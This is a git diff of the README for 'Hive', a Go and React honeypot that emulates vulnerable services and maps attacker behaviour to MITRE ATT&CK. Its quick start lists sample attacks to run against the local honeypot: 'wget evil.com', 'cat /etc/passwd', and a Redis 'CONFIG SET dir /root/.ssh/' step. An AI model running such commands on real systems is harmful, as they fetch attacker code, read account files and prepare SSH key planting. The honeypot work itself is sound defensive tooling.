@@ -1,4 +1,4 @@
-# Advanced Honeypot Network (Hive) 🐝🛡️
+# Hive - Advanced Honeypot Network 🐝🛡️
 
 [![Go Version](https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat&logo=go)](https://go.dev)
 [![React Version](https://img.shields.io/badge/React-19-61DAFB?style=flat&logo=react)](https://react.dev)
@@ -7,107 +7,107 @@
 
 > **An enterprise-grade, event-driven cyber deception platform built for real-time threat intelligence gathering.**
 
-**Hive** is a high-performance network honeypot designed to attract, deceive, and analyze cyber threats in real-time. Built from the ground up with **Go** for maximum concurrency and networking performance, and paired with a modern **React 19** frontend, it emulates vulnerable services to capture attacker behavior and automatically maps their actions to the **MITRE ATT&CK** framework.
+Designed to process thousands of attack events simultaneously, **Hive** relies on a modern architecture built for performance, scalability, and threat intelligence. The project pairs a lightning-fast **Go** backend with a reactive **React 19** frontend dashboard to attract, capture, and analyze attacker behavior.
 
 ---
 
-## 🎯 Executive Summary (For Recruiters & Engineering Managers)
+## 🎯 Executive Summary
 
-This project demonstrates proficiency in building scalable, asynchronous backend systems and modern frontend dashboards. Key engineering highlights include:
+Every interaction with an attacker becomes an actionable source of Threat Intelligence, allowing you to observe TTPs (Tactics, Techniques & Procedures) in a controlled environment without exposing production systems.
 
-- **Event-Driven Architecture**: Implemented a highly concurrent, lock-free (where possible) Event Bus in Go using goroutines and channels to process thousands of attack events per second without dropping packets.
-- **Low-Level Network Protocol Emulation**: Hand-crafted TCP listeners and protocol emulators (SSH, HTTP, MySQL, Redis) to simulate a realistic operating system environment, including a custom interactive pseudo-terminal (PTY) for SSH attackers.
-- **Real-Time Data Streaming**: Engineered a WebSocket streaming pipeline to push real-time attack data from the Go backend directly to a React frontend with sub-millisecond latency.
-- **Modern Full-Stack Expertise**: Showcases a strong understanding of both high-performance backend engineering (Go, Chi Router, Pub/Sub) and reactive frontend development (React 19, TypeScript, state management).
-- **Cybersecurity & Threat Intelligence**: Deep integration with the MITRE ATT&CK matrix using sliding-window algorithms and pattern matching to categorize attacker TTPs (Tactics, Techniques, and Procedures).
+- **⚡ High-Performance Backend (Go):** A fully asynchronous, 100% Lock-Free Event Bus built exclusively on Go channels and goroutines. It guarantees that network honeypots are never blocked, even under heavy analytical load.
+- **🌐 Low-Level Protocol Emulation:** Custom TCP listeners and an interactive SSH pseudo-terminal (PTY).
+- **🐝 Multi-Service Honeypots:** Intelligent simulation of HTTP (WordPress & phpMyAdmin traps), MySQL databases, and Redis datastores to faithfully recreate a corporate infrastructure target.
+- **🎨 Real-Time Dashboard (React 19 & TypeScript):** An ultra-low latency WebSocket pipeline streaming events from the Go engine straight to a fully responsive "Cyber Operations" UI designed for Security Operations Centers (SOC).
+- **🛡️ Cyber Threat Intelligence:** Automatic correlation with the **MITRE ATT&CK** framework, mapping attacker commands to specific TTPs. Automated extraction of Indicators of Compromise (IOCs) with exports in **STIX 2.1** format and dynamic firewall blocklist generation.
 
 ---
 
 ## 🏗️ System Architecture
 
-Hive relies on an asynchronous event-driven pipeline to ensure the simulated services are never blocked by data processing or database writes.
+Hive relies on an event-driven pipeline to decouple network capture listeners from heavy threat intelligence processing.
 
 ```text
                   ┌─────────────────────────────────────────────┐
   Attackers       │              Hive Backend (Go)              │
                   │                                             │
 ┌──────┐         │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐   │
-│ SSH  │────2222──│──│ sshd │  │ httpd│  │ ftpd │  │ smbd │   │
-│Client│         │  └──┬───┘  └──┬───┘  └──┬───┘  └──┬───┘   │
-└──────┘         │     │         │         │         │        │
-                 │  ┌──┴───┐  ┌──┴───┐                        │
-                 │  │mysqld│  │redisd│                        │
-                 │  └──┬───┘  └──┬───┘                        │
-                 │     │         │                             │
-                 │     ▼         ▼                             │
-                 │  ┌─────────────────┐                        │
-                 │  │    Event Bus    │  (Go Channels Pub/Sub) │
-                 │  └────────┬────────┘                        │
-                 │           │                                 │
-                 │     ┌─────┴─────┐                           │
-                 │     │ Processor │  (GeoIP Enrichment &      │
-                 │     │  MITRE    │   ATT&CK Mapping)         │
-                 │     │  Storage  │                           │
-                 │     └───────────┘                           │
-                 │                                             │
-                 │  ┌─────────────────┐                        │
-                 │  │   REST API      │  (go-chi Router)       │
-                 │  │   WebSocket     │  /ws/events            │
-                 │  └─────────────────┘                        │
-                 └──────────────┬──────────────────────────────┘
-                                │
-                 ┌──────────────┴──────────────────┐
-                 │    React 19 Dashboard (Vite)    │
-                 │    Real-time Attack Stream      │
-                 │    MITRE Heatmap • Export CTI   │
+│ SSH  │────2222──│──│ sshd │  │ httpd│  │mysqld│  │redisd│   │
+│ HTTP │────8080──│──└─┬───┘  └─┬───┘  └─┬───┘  └─┬───┘   │
+│MySQL │────3306──│    │         │         │         │        │
+│Redis │────6379──│    ▼         ▼         ▼         ▼        │
+└──────┘         │  ┌──────────────────────────────────┐      │
+                 │  │    Event Bus (Lock-Free Chan)    │      │
+                 │  └────────┬────────────────┬────────┘      │
+                 │           │                │               │
+                 │     ┌─────▼─────┐    ┌─────▼─────┐         │
+                 │     │ MITRE     │    │ STIX & FW │         │
+                 │     │ Engine    │    │ Processor │         │
+                 │     └───────────┘    └───────────┘         │
+                 │                                            │
+                 │  ┌──────────────────────────────────┐      │
+                 │  │   REST API & WebSocket Server    │      │
+                 │  │   (Port 8000)                    │      │
+                 │  └──────────────────────────────────┘      │
+                 └──────────────────┬─────────────────────────┘
+                                    │
+                 ┌──────────────────▼──────────────┐
+                 │    React 19 Cyber Dashboard     │
+                 │    Real-Time Telemetry Stream   │
                  └─────────────────────────────────┘
 ```
 
 ---
 
-## 🚀 Key Features
+## 🚀 Quick Start (Developer Mode)
 
-* **Multi-Service Emulation:** Intelligent simulation of SSH (fake interactive shell), HTTP (WordPress/phpMyAdmin traps), FTP, SMB, MySQL, and Redis.
-* **Asynchronous Event Pipeline:** Centralized background processing using Go channels, decoupling the network listeners from the heavy analytics processing.
-* **Live Threat Dashboard:** Watch attacks happen in real-time as the WebSocket stream pushes live JSON payloads straight to the React UI.
-* **GeoIP & MITRE ATT&CK Mapping:** Instantly enriches IP addresses with geographical data and matches terminal commands to 27 distinct MITRE ATT&CK techniques.
-* **Actionable CTI Export:** Automated extraction of Indicators of Compromise (IOCs) with STIX 2.1 formatting and firewall blocklist generation (iptables, Nginx).
+To run the platform locally and watch the attacks in real-time:
 
----
-
-## 💻 Quick Start (Developer Mode)
-
-To run the platform locally and see the real-time event stream in action:
-
-1. **Start the Go Backend & API:**
+1. **Start the Go Backend (Honeypots + Event Bus + MITRE/STIX Engines):**
    ```bash
    cd advance-honeypot-network
    go run ./cmd/hive
    ```
-   *The backend will start listening on port 2222 for SSH connections and port 8000 for the WebSocket API.*
+   *The services will bind to ports: 2222 (SSH), 8080 (HTTP), 3306 (MySQL), 6379 (Redis), and 8000 (API).*
 
 2. **Start the React Dashboard:**
    ```bash
    cd frontend
-   npm install
    npm run dev
    ```
    *Navigate to `http://localhost:5173` in your browser.*
 
 3. **Simulate an Attack:**
-   Open a new terminal window and connect to your own honeypot. 
+   Open a new terminal window and launch one of the following attacks against your local honeypot:
    
-   *Note: If you get a "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!" error, it is because the honeypot generates its own SSH keys which conflict with previously saved keys for localhost on port 2222. Run these commands to clear the old keys and make the connection work:*
+   *Note: If you encounter a "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!" error with SSH (because the honeypot generates fresh SSH keys on restart), run:*
    ```bash
    ssh-keygen -f '/home/tanos/.ssh/known_hosts' -R '[127.0.0.1]:2222'
    ssh-keygen -f '/home/tanos/.ssh/known_hosts' -R '[localhost]:2222'
    ```
 
-   Then, connect to the honeypot:
+   **Test SSH:**
    ```bash
    ssh root@localhost -p 2222
+   # Type any password, then run: wget evil.com or cat /etc/passwd
    ```
-   Type any password, then run commands like `ls`, `whoami`, or `pwd`. Watch the React dashboard light up with your real-time actions!
+
+   **Test HTTP (WordPress Scans):**
+   ```bash
+   curl http://localhost:8080/wp-login.php
+   ```
+
+   **Test Redis:**
+   ```bash
+   telnet localhost 6379
+   # Type: CONFIG SET dir /root/.ssh/
+   ```
+
+4. **Observe the Results:**
+   - The React dashboard lights up with your live events.
+   - MITRE techniques (e.g., T1105) are identified automatically.
+   - The file `iptables-blocklist.txt` is automatically generated with your IP address ready to be dropped.
+   - The file `threat-intel.stix.json` captures your Indicators of Compromise (IOCs).
 
 ---
 
@@ -115,17 +115,19 @@ To run the platform locally and see the real-time event stream in action:
 
 ```text
 advance-honeypot-network/
-├── cmd/hive/              # Go entry point (main binary)
-├── pkg/types/             # Shared domain structures (Event, Session, IOC)
+├── cmd/hive/              # Main entry point (starts all services)
 ├── internal/
-│   ├── sshd/              # SSH Honeypot (Custom PTY & auth bypass)
-│   ├── httpd/             # HTTP Honeypot (Vulnerability traps)
-│   ├── event/             # Concurrent Event Bus & Pub/Sub pipeline
-│   ├── mitre/             # MITRE ATT&CK correlation engine
-│   ├── store/             # PostgreSQL & Redis storage interfaces
-│   └── api/               # REST API & WebSocket server
+│   ├── types/             # Shared data structures (Event struct)
+│   ├── sshd/              # SSH Honeypot (Interactive Pseudo-Terminal)
+│   ├── httpd/             # HTTP Honeypot (WP/phpMyAdmin traps)
+│   ├── mysqld/            # MySQL Honeypot (Auth capture)
+│   ├── redisd/            # Redis Honeypot (RESP protocol parsing)
+│   ├── event/             # 100% Lock-Free Channel-based Event Bus
+│   ├── mitre/             # MITRE TTP Correlation Engine
+│   ├── store/             # IOC Processor (STIX & Blocklist Generator)
+│   └── api/               # REST API and WebSockets Server
 ├── frontend/              # React 19 + TypeScript SPA
-└── README.md              # Project documentation
+└── README.md              # Documentation
 ```
 
 ---
